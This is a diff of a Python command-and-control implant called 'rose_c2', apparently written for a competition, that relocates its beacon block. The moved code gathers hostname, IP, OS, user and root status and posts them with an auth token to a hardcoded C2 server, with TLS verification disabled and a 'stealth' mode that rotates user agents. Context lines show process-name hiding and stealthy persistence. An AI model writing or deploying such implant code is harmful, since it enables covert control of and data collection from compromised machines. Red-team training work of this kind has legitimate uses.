@@ -25,250 +25,6 @@ def immediate_stealth():
 # Apply stealth immediately
 immediate_stealth()
 
-import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
-from urllib.parse import urlencode
-
-SERVER_URL="https://192.168.10.11:443/"
-AGENT_NAME="example1"
-AGENT_TYPE="rose_c2"
-AUTH_TOKEN="plaintext_really"
-
-# Allow connection to the server (uses a self signed cert)
-CTX = ssl.create_default_context()
-CTX.check_hostname = False
-CTX.verify_mode = ssl.CERT_NONE
-
-def print_debug(message):
-    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
-    # For example, if you have a DEBUG flag set, then print to console/logfile.
-    # Otherwise (full deploy for comp), suppress output.
-    print(message)
-
-def get_platform_dist():
-    """
-    Helper func that returns a string with the platform distribution.
-    """
-    sys_platform = platform.system()
-
-    # --- Linux Handling ---
-    if sys_platform == "Linux":
-        # Try Python 3.10+ native method (Standardized os-release)
-        if hasattr(platform, 'freedesktop_os_release'):
-            try:
-                info = platform.freedesktop_os_release()
-                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
-            except OSError:
-                pass
-
-        # 2. Manual parsing for older Python versions (< 3.10)
-        if os.path.isfile("/etc/os-release"):
-            info = {}
-            with open("/etc/os-release") as f:
-                for line in f:
-                    # Parse KEY=VALUE, ignoring comments and empty lines
-                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?\$', line)
-                    if match:
-                        info[match.group(1)] = match.group(2)
-            return (
-                info.get('ID', 'linux'), 
-                info.get('VERSION_ID', info.get('VERSION', '')), 
-                info.get('PRETTY_NAME', '')
-            )
-
-    # Fallback for MacOS or unknown systems
-    return (sys_platform, platform.release(), platform.version())
-
-def get_os(simple=False):
-    """
-    Gets the approximate OS used, optionally simplified to highest level possible.
-    For example: Ubuntu, Debian, Rocky, RHEL
-
-    Args: simple(Bool)
-    Returns: osType(String)
-    """
-    system = platform.system()
-
-    if system == "Linux":
-        if simple:
-            return get_platform_dist()[1] # Ubuntu, debian, redhat
-        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)
-
-    if simple:
-        return platform.system() # FreeBSD
-    return f"{platform.system()} {platform.release()}" #FreeBSD XYZ
-
-def get_perms():
-    """
-    Gets the execution perm level (user and elevation level).
-    Returns: isRunAsElevated(bool), runAsUser(String)
-    """
-    system = platform.system()
-    
-    if system in ("Linux", "FreeBSD"):
-        # euid 0 - root OR sudo
-        is_root = (os.geteuid() == 0)
-
-        # Detect sudo. May have unexpected results (False when it is actually using SUDO)
-        # depending on OS and inconsistent usage of SUDO_USER variable across systems. 
-        sudo_user = os.environ.get("SUDO_USER")
-        if sudo_user:
-            runAsUser = sudo_user
-        else:
-            # Normal user or directly root
-            runAsUser = getpass.getuser()
-        return is_root, runAsUser
-    
-    print_debug("get_perms(): reached unexpected unsupported OS block")
-    return False, ""
-
-def get_primary_ip():
-    """
-    Attempts to get the primary IP address of the local machine.
-    Returns: ip(String) or "0.0.0.0" if failed
-    """
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        # Connect to an external host (e.g., Google's public DNS or test-net-3)
-        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
-        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # test-net-3 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work under certain conditions so do Google for reliability.
-        ip_address = s.getsockname()[0]
-    except Exception as E:
-        ip_address = "0.0.0.0" # safe default
-        print_debug(f"get_primary_ip() error: {E}")
-    finally:
-        s.close()
-    return ip_address
-
-def get_system_details():
-    """
-    Helper func that builds the overall system info dictionary
-    Returns: sysInfo(dict)
-    """
-    sysInfo = {
-        "os": get_os(),
-        "executionUser": get_perms()[1],
-        "executionAdmin": get_perms()[0],
-        "hostname": socket.gethostname(), #alternate method if FQDN is desired: socket.getfqdn()
-        "ipadd": get_primary_ip()
-    }
-    return sysInfo
-
-def _stealth_request(url, data, timeout):
-    global AUTH_TOKEN
-    
-    headers = {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
-            "curl/8.2.1",
-            "Wget/1.21.3"
-        ]),
-        "Accept": "application/json,text/plain,*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Connection": "keep-alive",
-        "Cache-Control": "no-cache",
-        "Content-Type": "application/json"
-    }
-
-    try:
-        req = urllib.request.Request(
-            url,
-            data=data,
-            headers=headers,
-            method="POST"
-        )
-
-        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as response:
-            response_text = response.read().decode("utf-8", errors="ignore")
-
-            if response.getcode() == 200:
-                if "agent/beacon" in url and response_text != AUTH_TOKEN:
-                    AUTH_TOKEN = response_text
-                return True, response_text
-
-            return False, f"HTTP {response.getcode()}"
-
-    except Exception as e:
-        return False, str(e)
-
-def send_message(endpoint, message="", oldStatus=True, newStatus=True, 
-                systemInfo=get_system_details(), server_timeout=5, 
-                stealth_mode=False):
-    """
-    Sends the specified data to the server.
-    Handles the full process and attaching agent name/auth/system details.
-
-    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool),stealth_mode(bool)
-    Returns: status(Bool)
-    """
-    global AUTH_TOKEN
-    if not SERVER_URL:
-        # Server comms are intentionally disabled (server_url is an empty string)
-        # Maybe redirect to print_debug instead?
-        return False, "no SERVER_URL value specified"
-
-    try:
-        url = SERVER_URL + endpoint
-
-        # Prep payload
-        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
-        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
-        # assembly logic of the payload, so we attach the same data to every communication.
-        payload = {
-            "name": AGENT_NAME,
-            "hostname": systemInfo["hostname"],
-            "ip": systemInfo["ipadd"],
-            "os": systemInfo["os"],
-            "executionUser": systemInfo["executionUser"],
-            "executionAdmin": systemInfo["executionAdmin"],
-            "auth": AUTH_TOKEN,
-            "agent_type": AGENT_TYPE,
-            "oldStatus": oldStatus,
-            "newStatus": newStatus,
-            "message": message
-        }
-
-        # Prepare data as JSON for transmit
-        data = json.dumps(payload).encode("utf-8")
-
-        if stealth_mode:
-            # Use stealth implementation
-            return _stealth_request(url, data, server_timeout)
-        else:
-            # Use original implementation
-            req = urllib.request.Request(
-                url,
-                data=data,
-                headers={"Content-Type": "application/json"},
-                method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
-            )
-
-            # Send payload
-            with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
-                if response.getcode() == 200:
-                    # Good result! Now parse and return the endpoint
-                    print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
-                    response_text = response.read().decode('utf-8')
-                    # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
-                    # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
-                    if "agent/beacon" in endpoint:
-                        if response_text != AUTH_TOKEN:
-                            AUTH_TOKEN = response_text
-                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
-                    return True, response_text
-                else:
-                    print_debug(f"send_message({url}): Server error: {response.getcode()}")
-
-    # Error handling
-    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
-    except urllib.error.HTTPError as e:
-        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
-    except urllib.error.URLError as e:
-        print_debug(f"send_message({url}): URL error: {e.reason}")
-    except Exception as e:
-        print_debug(f"send_message({url}): Beacon error: {e}")
-    return False, ""
-
 def hide_process_name():
     """Change the process name to something legitimate"""
     try:
@@ -629,8 +385,250 @@ def create_stealthy_persistence():
     except Exception as e:
         print_debug(f"Failed to create stealthy persistence: {e}")
         return False
-    
 
+import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
+from urllib.parse import urlencode
+
+SERVER_URL="https://192.168.10.11:443/"
+AGENT_NAME="example1"
+AGENT_TYPE="rose_c2"
+AUTH_TOKEN="plaintext_really"
+
+# Allow connection to the server (uses a self signed cert)
+CTX = ssl.create_default_context()
+CTX.check_hostname = False
+CTX.verify_mode = ssl.CERT_NONE
+
+def print_debug(message):
+    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
+    # For example, if you have a DEBUG flag set, then print to console/logfile.
+    # Otherwise (full deploy for comp), suppress output.
+    print(message)
+
+def get_platform_dist():
+    """
+    Helper func that returns a string with the platform distribution.
+    """
+    sys_platform = platform.system()
+
+    # --- Linux Handling ---
+    if sys_platform == "Linux":
+        # Try Python 3.10+ native method (Standardized os-release)
+        if hasattr(platform, 'freedesktop_os_release'):
+            try:
+                info = platform.freedesktop_os_release()
+                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
+            except OSError:
+                pass
+
+        # 2. Manual parsing for older Python versions (< 3.10)
+        if os.path.isfile("/etc/os-release"):
+            info = {}
+            with open("/etc/os-release") as f:
+                for line in f:
+                    # Parse KEY=VALUE, ignoring comments and empty lines
+                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?\$', line)
+                    if match:
+                        info[match.group(1)] = match.group(2)
+            return (
+                info.get('ID', 'linux'), 
+                info.get('VERSION_ID', info.get('VERSION', '')), 
+                info.get('PRETTY_NAME', '')
+            )
+
+    # Fallback for MacOS or unknown systems
+    return (sys_platform, platform.release(), platform.version())
+
+def get_os(simple=False):
+    """
+    Gets the approximate OS used, optionally simplified to highest level possible.
+    For example: Ubuntu, Debian, Rocky, RHEL
+
+    Args: simple(Bool)
+    Returns: osType(String)
+    """
+    system = platform.system()
+
+    if system == "Linux":
+        if simple:
+            return get_platform_dist()[1] # Ubuntu, debian, redhat
+        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)
+
+    if simple:
+        return platform.system() # FreeBSD
+    return f"{platform.system()} {platform.release()}" #FreeBSD XYZ
+
+def get_perms():
+    """
+    Gets the execution perm level (user and elevation level).
+    Returns: isRunAsElevated(bool), runAsUser(String)
+    """
+    system = platform.system()
+    
+    if system in ("Linux", "FreeBSD"):
+        # euid 0 - root OR sudo
+        is_root = (os.geteuid() == 0)
+
+        # Detect sudo. May have unexpected results (False when it is actually using SUDO)
+        # depending on OS and inconsistent usage of SUDO_USER variable across systems. 
+        sudo_user = os.environ.get("SUDO_USER")
+        if sudo_user:
+            runAsUser = sudo_user
+        else:
+            # Normal user or directly root
+            runAsUser = getpass.getuser()
+        return is_root, runAsUser
+    
+    print_debug("get_perms(): reached unexpected unsupported OS block")
+    return False, ""
+
+def get_primary_ip():
+    """
+    Attempts to get the primary IP address of the local machine.
+    Returns: ip(String) or "0.0.0.0" if failed
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Connect to an external host (e.g., Google's public DNS or test-net-3)
+        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
+        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # test-net-3 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work under certain conditions so do Google for reliability.
+        ip_address = s.getsockname()[0]
+    except Exception as E:
+        ip_address = "0.0.0.0" # safe default
+        print_debug(f"get_primary_ip() error: {E}")
+    finally:
+        s.close()
+    return ip_address
+
+def get_system_details():
+    """
+    Helper func that builds the overall system info dictionary
+    Returns: sysInfo(dict)
+    """
+    sysInfo = {
+        "os": get_os(),
+        "executionUser": get_perms()[1],
+        "executionAdmin": get_perms()[0],
+        "hostname": socket.gethostname(), #alternate method if FQDN is desired: socket.getfqdn()
+        "ipadd": get_primary_ip()
+    }
+    return sysInfo
+
+def _stealth_request(url, data, timeout):
+    global AUTH_TOKEN
+    
+    headers = {
+        "User-Agent": random.choice([
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
+            "curl/8.2.1",
+            "Wget/1.21.3"
+        ]),
+        "Accept": "application/json,text/plain,*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "keep-alive",
+        "Cache-Control": "no-cache",
+        "Content-Type": "application/json"
+    }
+
+    try:
+        req = urllib.request.Request(
+            url,
+            data=data,
+            headers=headers,
+            method="POST"
+        )
+
+        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as response:
+            response_text = response.read().decode("utf-8", errors="ignore")
+
+            if response.getcode() == 200:
+                if "agent/beacon" in url and response_text != AUTH_TOKEN:
+                    AUTH_TOKEN = response_text
+                return True, response_text
+
+            return False, f"HTTP {response.getcode()}"
+
+    except Exception as e:
+        return False, str(e)
+
+def send_message(endpoint, message="", oldStatus=True, newStatus=True, 
+                systemInfo=get_system_details(), server_timeout=5, 
+                stealth_mode=False):
+    """
+    Sends the specified data to the server.
+    Handles the full process and attaching agent name/auth/system details.
+
+    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool),stealth_mode(bool)
+    Returns: status(Bool)
+    """
+    global AUTH_TOKEN
+    if not SERVER_URL:
+        # Server comms are intentionally disabled (server_url is an empty string)
+        # Maybe redirect to print_debug instead?
+        return False, "no SERVER_URL value specified"
+
+    try:
+        url = SERVER_URL + endpoint
+
+        # Prep payload
+        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
+        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
+        # assembly logic of the payload, so we attach the same data to every communication.
+        payload = {
+            "name": AGENT_NAME,
+            "hostname": systemInfo["hostname"],
+            "ip": systemInfo["ipadd"],
+            "os": systemInfo["os"],
+            "executionUser": systemInfo["executionUser"],
+            "executionAdmin": systemInfo["executionAdmin"],
+            "auth": AUTH_TOKEN,
+            "agent_type": AGENT_TYPE,
+            "oldStatus": oldStatus,
+            "newStatus": newStatus,
+            "message": message
+        }
+
+        # Prepare data as JSON for transmit
+        data = json.dumps(payload).encode("utf-8")
+
+        if stealth_mode:
+            # Use stealth implementation
+            return _stealth_request(url, data, server_timeout)
+        else:
+            # Use original implementation
+            req = urllib.request.Request(
+                url,
+                data=data,
+                headers={"Content-Type": "application/json"},
+                method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
+            )
+
+            # Send payload
+            with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
+                if response.getcode() == 200:
+                    # Good result! Now parse and return the endpoint
+                    print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
+                    response_text = response.read().decode('utf-8')
+                    # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
+                    # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
+                    if "agent/beacon" in endpoint:
+                        if response_text != AUTH_TOKEN:
+                            AUTH_TOKEN = response_text
+                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
+                    return True, response_text
+                else:
+                    print_debug(f"send_message({url}): Server error: {response.getcode()}")
+
+    # Error handling
+    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
+    except urllib.error.HTTPError as e:
+        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
+    except urllib.error.URLError as e:
+        print_debug(f"send_message({url}): URL error: {e.reason}")
+    except Exception as e:
+        print_debug(f"send_message({url}): Beacon error: {e}")
+    return False, ""
 
 class AdaptiveC2Client:
     def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
